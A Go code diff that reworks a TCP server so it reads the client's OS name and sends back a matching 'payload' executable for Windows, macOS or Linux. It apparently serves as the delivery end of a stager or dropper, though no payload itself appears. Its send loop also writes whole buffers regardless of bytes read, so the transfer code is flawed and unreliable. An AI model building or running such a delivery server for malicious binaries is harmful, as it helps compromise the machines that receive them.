@@ -6,6 +6,7 @@ import (
 	"net"
 	"os"
 	"strconv"
+	"strings"
 )
 
 const (
@@ -17,6 +18,7 @@ const (
 
 var count = 0
 var logger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime)
+var payload os.File
 
 func handleError(err error) {
 	if err != nil {
@@ -25,29 +27,39 @@ func handleError(err error) {
 	}
 }
 
-func handleConnection(conn net.Conn) {
+func sendPayload(conn net.Conn, path string) {
+	payload, err := os.Open(path)
+	handleError(err)
+	fileInfo, err := payload.Stat()
+	handleError(err)
+	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
+	fileName := fillString(fileInfo.Name(), 64)
+	sendBuffer := make([]byte, BUFFERSIZE)
+	conn.Write([]byte(fileSize))
+	conn.Write([]byte(fileName))
 	for {
-		payload, err := os.Open("payload.txt")
-		handleError(err)
-		fileInfo, err := payload.Stat()
-		handleError(err)
-		defer conn.Close()
-		fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
-		fileName := fillString(fileInfo.Name(), 64)
-		conn.Write([]byte(fileSize))
-		conn.Write([]byte(fileName))
-		sendBuffer := make([]byte, BUFFERSIZE)
-		for {
-			_, err = payload.Read(sendBuffer)
-			if err == io.EOF {
-				break
-			}
-			conn.Write(sendBuffer)
+		_, err = payload.Read(sendBuffer)
+		if err == io.EOF {
+			break
 		}
-		logger.Println("File sent in theory")
-		conn.Close()
-		break
+		conn.Write(sendBuffer)
 	}
+}
+
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+	bufferOsName := make([]byte, 9)
+	conn.Read(bufferOsName)
+	osName := strings.Trim(string(bufferOsName), ":")
+	if osName == "windows" {
+		sendPayload(conn, "..\\payload\\windows\\payload-amd64.exe")
+	} else if osName == "darwin" {
+		sendPayload(conn, "../payload/darwin/payload-amd64-darwin")
+	} else if osName == "linux" {
+		sendPayload(conn, "../payload/linux/payload-amd64-linux")
+	}
+	logger.Println("File sent in theory")
+	conn.Close()
 }
 
 func fillString(retunString string, toLength int) string { // Fill string with bytes
